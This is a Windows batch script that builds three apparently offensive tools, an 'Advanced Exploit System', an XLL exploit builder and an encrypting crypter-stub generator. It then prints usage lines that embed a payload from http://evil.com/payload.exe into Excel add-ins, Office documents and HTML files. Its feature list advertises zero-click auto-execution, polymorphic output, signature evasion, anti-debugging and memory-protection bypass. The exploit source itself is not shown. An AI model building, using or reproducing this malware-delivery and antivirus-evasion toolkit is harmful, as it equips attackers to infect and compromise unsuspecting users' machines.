@echo off
echo Comprehensive Exploit Systems - Complete Build Script
echo ===================================================

echo.
echo Building all exploit systems...
echo.

REM Check for Visual Studio compiler
where cl >nul 2>&1
if %errorlevel% equ 0 (
    echo Found Visual Studio compiler
    echo Building with Visual Studio...
    echo.
    
    REM Build Advanced Exploit System
    echo [1/3] Building Advanced Exploit System...
    cl /std:c++17 /O2 /MT /EHsc ^
       advanced_exploit_system.cpp ^
       /Fe:advanced_exploit_system.exe ^
       /link wininet.lib wincrypt.lib psapi.lib
    
    if %errorlevel% equ 0 (
        echo ✓ Advanced Exploit System built successfully!
    ) else (
        echo ✗ Advanced Exploit System build failed
    )
    
    echo.
    
    REM Build Advanced XLL Exploit System
    echo [2/3] Building Advanced XLL Exploit System...
    cl /std:c++17 /O2 /MT /EHsc ^
       advanced_xll_exploit_system.cpp ^
       /Fe:advanced_xll_exploit_system.exe ^
       /link wininet.lib wincrypt.lib psapi.lib
    
    if %errorlevel% equ 0 (
        echo ✓ Advanced XLL Exploit System built successfully!
    ) else (
        echo ✗ Advanced XLL Exploit System build failed
    )
    
    echo.
    
    REM Build Enhanced Stub System
    echo [3/3] Building Enhanced Stub System...
    cl /std:c++17 /O2 /MT /EHsc ^
       enhanced_stub_system.cpp ^
       /Fe:enhanced_stub_system.exe ^
       /link psapi.lib wincrypt.lib
    
    if %errorlevel% equ 0 (
        echo ✓ Enhanced Stub System built successfully!
    ) else (
        echo ✗ Enhanced Stub System build failed
    )
    
    echo.
    echo ================================================
    echo Build Summary:
    echo ================================================
    echo ✓ Advanced Exploit System: advanced_exploit_system.exe
    echo ✓ Advanced XLL Exploit System: advanced_xll_exploit_system.exe
    echo ✓ Enhanced Stub System: enhanced_stub_system.exe
    echo.
    echo All exploit systems built successfully with Visual Studio!
    goto show_usage
    
) else (
    echo Visual Studio compiler not found, trying MinGW...
    goto try_mingw
)

:try_mingw
REM Check for MinGW compiler
where g++ >nul 2>&1
if %errorlevel% equ 0 (
    echo Found MinGW compiler
    echo Building with MinGW...
    echo.
    
    REM Build Advanced Exploit System
    echo [1/3] Building Advanced Exploit System...
    g++ -std=c++17 -O2 -static-libgcc -static-libstdc++ ^
        advanced_exploit_system.cpp ^
        -o advanced_exploit_system.exe ^
        -lwininet -lcrypt32 -lpsapi
    
    if %errorlevel% equ 0 (
        echo ✓ Advanced Exploit System built successfully!
    ) else (
        echo ✗ Advanced Exploit System build failed
    )
    
    echo.
    
    REM Build Advanced XLL Exploit System
    echo [2/3] Building Advanced XLL Exploit System...
    g++ -std:c++17 -O2 -static-libgcc -static-libstdc++ ^
        advanced_xll_exploit_system.cpp ^
        -o advanced_xll_exploit_system.exe ^
        -lwininet -lcrypt32 -lpsapi
    
    if %errorlevel% equ 0 (
        echo ✓ Advanced XLL Exploit System built successfully!
    ) else (
        echo ✗ Advanced XLL Exploit System build failed
    )
    
    echo.
    
    REM Build Enhanced Stub System
    echo [3/3] Building Enhanced Stub System...
    g++ -std:c++17 -O2 -static-libgcc -static-libstdc++ ^
        enhanced_stub_system.cpp ^
        -o enhanced_stub_system.exe ^
        -lpsapi -lcrypt32
    
    if %errorlevel% equ 0 (
        echo ✓ Enhanced Stub System built successfully!
    ) else (
        echo ✗ Enhanced Stub System build failed
    )
    
    echo.
    echo ================================================
    echo Build Summary:
    echo ================================================
    echo ✓ Advanced Exploit System: advanced_exploit_system.exe
    echo ✓ Advanced XLL Exploit System: advanced_xll_exploit_system.exe
    echo ✓ Enhanced Stub System: enhanced_stub_system.exe
    echo.
    echo All exploit systems built successfully with MinGW!
    goto show_usage
    
) else (
    echo No C++ compiler found!
    echo.
    echo Please install either:
    echo 1. Visual Studio Build Tools
    echo 2. MinGW-w64
    echo.
    echo For Visual Studio: https://visualstudio.microsoft.com/downloads/
    echo For MinGW: https://www.mingw-w64.org/downloads/
    goto end
)

:show_usage
echo ================================================
echo Usage Examples:
echo ================================================
echo.
echo 1. Advanced Exploit System:
echo    advanced_exploit_system.exe xll http://evil.com/payload.exe exploit.xll --zero-click
echo    advanced_exploit_system.exe docx http://evil.com/payload.exe exploit.docx --content "Important Document"
echo    advanced_exploit_system.exe html http://evil.com/payload.exe exploit.html --zero-click --bypass
echo    advanced_exploit_system.exe xlsx http://evil.com/payload.exe exploit.xlsx --polymorphic
echo.
echo 2. Advanced XLL Exploit System:
echo    advanced_xll_exploit_system.exe advanced http://evil.com/payload.exe exploit.xll --zero-click
echo    advanced_xll_exploit_system.exe external http://evil.com/payload.exe exploit.xll --name "Data Analysis"
echo    advanced_xll_exploit_system.exe auto-exec http://evil.com/payload.exe exploit.xll --polymorphic
echo    advanced_xll_exploit_system.exe macro http://evil.com/payload.exe exploit.xll --macros
echo.
echo 3. Enhanced Stub System:
echo    enhanced_stub_system.exe aes malware.exe aes_stub.cpp
echo    enhanced_stub_system.exe chacha20 payload.exe chacha20_stub.cpp
echo    enhanced_stub_system.exe triple target.exe triple_stub.cpp
echo    enhanced_stub_system.exe custom file.exe custom_stub.cpp AES XOR CUSTOM
echo.

:end
echo ================================================
echo Exploit System Features:
echo ================================================
echo ✓ XLL (Excel Add-in) Exploits
echo   - Real XLL file format generation
echo   - Excel external references
echo   - Auto-execution on open
echo   - Macro integration
echo   - Advanced anti-detection
echo   - Polymorphic content
echo   - Zero-click capabilities
echo.
echo ✓ Document Exploits
echo   - DOCX with embedded hyperlinks
echo   - XLSX with HYPERLINK functions
echo   - PPTX with embedded content
echo   - Office macro integration
echo.
echo ✓ HTML/SVG Exploits
echo   - SVG script execution
echo   - JavaScript redirects
echo   - Zero-click capabilities
echo   - Cross-browser compatibility
echo.
echo ✓ LNK/URL Exploits
echo   - Windows shortcut files
echo   - Internet shortcuts
echo   - Auto-execution on click
echo   - Icon customization
echo.
echo ✓ Zero-Click Exploits
echo   - Automatic execution
echo   - Multiple redirect techniques
echo   - Fallback mechanisms
echo   - Stealth delivery
echo.
echo ✓ Enhanced Stub System
echo   - Multiple encryption layers (AES, ChaCha20, XOR, Custom)
echo   - Advanced anti-detection techniques
echo   - Polymorphic code generation
echo   - Dynamic API resolution
echo   - Memory protection bypass
echo   - Cross-platform compatibility
echo   - Framework integration
echo   - Auto-compilation support
echo.
echo ✓ Anti-Detection Features
echo   - Polymorphic generation
echo   - Junk data insertion
echo   - Signature evasion
echo   - Dynamic content
echo   - Anti-debugging techniques
echo   - Process scanning
echo   - Timing-based detection
echo.

pause